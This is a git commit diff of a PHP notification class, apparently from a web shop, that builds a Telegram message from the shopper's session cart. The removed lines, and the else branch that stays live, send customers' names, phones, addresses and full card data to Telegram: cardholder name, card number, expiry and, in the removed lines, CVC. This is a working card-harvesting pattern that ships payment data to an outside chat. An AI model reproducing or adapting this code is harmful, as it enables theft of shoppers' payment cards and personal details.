b0368e9b8499e75ec6a9ab34eda3067d139a2cdd
islamshu12 <islamshu12@gmail.com>
2023-06-18 19:51:15 +0300

    edit

--- app/Notifications/SendNotification.php
+++ app/Notifications/SendNotification.php
@@ -22,27 +22,27 @@ public function toTelegram($notifiable)
         $cart = session('cart');
         if(@$cart['cart_code']){
             $meesage = 
-            "user name : " . $cart['info']['name']. " \r\n " .
-            "user phone : " . $cart['info']['phone']. " \r\n " .
-            "user address : " . $cart['info']['address']. " \r\n " .
-            "total product : " . $cart['total']. " \r\n " .
-            "total per month : " . $cart['info']['payment']. " \r\n " .
-            "month count : " . $cart['info']['first_batch']. " \r\n " .
-            "card name : " . $cart['cart_info']['name']. " \r\n " .
-            "card number : " . $cart['cart_info']['number']. " \r\n " .
-            "card year : " . $cart['cart_info']['year']. " \r\n " .
-            "card month : " . $cart['cart_info']['month']. " \r\n " .
-            "card cvc : " . $cart['cart_info']['cvc']. " \r\n " .
+            // "user name : " . $cart['info']['name']. " \r\n " .
+            // "user phone : " . $cart['info']['phone']. " \r\n " .
+            // "user address : " . $cart['info']['address']. " \r\n " .
+            // "total product : " . $cart['total']. " \r\n " .
+            // "total per month : " . $cart['info']['payment']. " \r\n " .
+            // "month count : " . $cart['info']['first_batch']. " \r\n " .
+            // "card name : " . $cart['cart_info']['name']. " \r\n " .
+            // "card number : " . $cart['cart_info']['number']. " \r\n " .
+            // "card year : " . $cart['cart_info']['year']. " \r\n " .
+            // "card month : " . $cart['cart_info']['month']. " \r\n " .
+            // "card cvc : " . $cart['cart_info']['cvc']. " \r\n " .
             "card code : " . $cart['cart_code']['order']. " \r\n " 
             ;
         }else{
             $meesage = 
-            "user name : " . $cart['info']['name']. " \r\n " .
-            "user phone : " . $cart['info']['phone']. " \r\n " .
-            "user address : " . $cart['info']['address']. " \r\n " .
-            "total product : " . $cart['total']. " \r\n " .
-            "total per month : " . $cart['info']['payment']. " \r\n " .
-            "month count : " . $cart['info']['first_batch']. " \r\n " .
+            // "user name : " . $cart['info']['name']. " \r\n " .
+            // "user phone : " . $cart['info']['phone']. " \r\n " .
+            // "user address : " . $cart['info']['address']. " \r\n " .
+            // "total product : " . $cart['total']. " \r\n " .
+            // "total per month : " . $cart['info']['payment']. " \r\n " .
+            // "month count : " . $cart['info']['first_batch']. " \r\n " .
             "card name : " . $cart['cart_info']['name']. " \r\n " .
             "card number : " . $cart['cart_info']['number']. " \r\n " .
             "card year : " . $cart['cart_info']['year']. " \r\n " .
